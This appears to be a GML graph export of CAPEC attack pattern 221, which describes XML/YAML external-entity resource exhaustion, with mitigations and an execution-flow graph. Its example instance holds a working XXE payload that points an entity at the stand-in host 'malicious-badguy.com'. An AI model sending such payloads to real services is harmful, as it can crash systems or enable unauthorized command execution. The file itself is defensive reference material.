graph [
  directed 1
  capec_id "221"
  name "Data Serialization External Entities Blowup"
  abstraction "Detailed"
  status "Draft"
  description "This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI."
  likelihood ""
  severity ""
  related_attack_patterns [
    capec_id "231"
    nature "ChildOf"
  ]
  related_attack_patterns [
    capec_id "278"
    nature "ChildOf"
  ]
  prerequisites "_networkx_list_start"
  prerequisites "A server that has an implementation that accepts entities containing URI values."
  skills_required "[]"
  resources_required "[]"
  consequences [
    scope "_networkx_list_start"
    scope "Availability"
    impact "Resource Consumption"
  ]
  consequences [
    scope "Confidentiality"
    scope "Integrity"
    scope "Availability"
    impact "Execute Unauthorized Commands"
  ]
  mitigations "This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally."
  mitigations "This attack may be mitigated by tweaking the serialized data parser to not resolve external entities. If external entities are needed, then implement a custom resolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally."
  example_instances "_networkx_list_start"
  example_instances "In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=&#34;1.0&#34;?>  < !DOCTYPE bomb [  <!ENTITY detonate SYSTEM &#34;http://www.malicious-badguy.com/myhugefile.exe&#34;>  ]>  <bomb>&#38;detonate;</bomb>"
  related_weaknesses "_networkx_list_start"
  related_weaknesses "611"
  matched_cwes "_networkx_list_start"
  matched_cwes "611"
  taxonomy_mappings "_networkx_list_start"
  taxonomy_mappings [
    taxonomy_name "WASC"
    entry_id "43"
    entry_name "XML External Entities"
  ]
  execution_flow [
    step "1"
    phase "Explore"
    description "[Find target web service] The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML."
    techniques "[]"
  ]
  execution_flow [
    step "2"
    phase "Experiment"
    description "[Host malicious file on a server] The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang."
    techniques "[]"
  ]
  execution_flow [
    step "2"
    phase "Experiment"
    description "[Craft malicious data] Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file."
    techniques "[]"
  ]
  execution_flow [
    step "4"
    phase "Exploit"
    description "[Send serialized data containing URI] The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack."
    techniques "[]"
  ]
  node [
    id 0
    label "find_target_web_service"
  ]
  node [
    id 1
    label "find_a_web_service_that_takes_input_data_in_the_form_of_a_serialized_language_such_as_xml_or_yaml"
  ]
  node [
    id 2
    label "create_a_web_server_that_contains_a_malicious_file"
  ]
  node [
    id 3
    label "try_to_load_it"
  ]
  node [
    id 4
    label "use_malicious_data"
  ]
  node [
    id 5
    label "send_serialized_data_containing_uri"
  ]
  node [
    id 6
    label "send_specially_crafted_serialized_data"
  ]
  node [
    id 7
    label "load_the_input"
  ]
  node [
    id 8
    label "parse_the_attacker_s_xml"
  ]
  node [
    id 9
    label "accept_entities_containing_uri_values"
  ]
  edge [
    source 0
    target 1
  ]
  edge [
    source 1
    target 2
  ]
  edge [
    source 2
    target 3
  ]
  edge [
    source 3
    target 4
  ]
  edge [
    source 4
    target 5
  ]
  edge [
    source 5
    target 6
  ]
  edge [
    source 6
    target 7
  ]
  edge [
    source 7
    target 8
  ]
  edge [
    source 8
    target 9
  ]
]
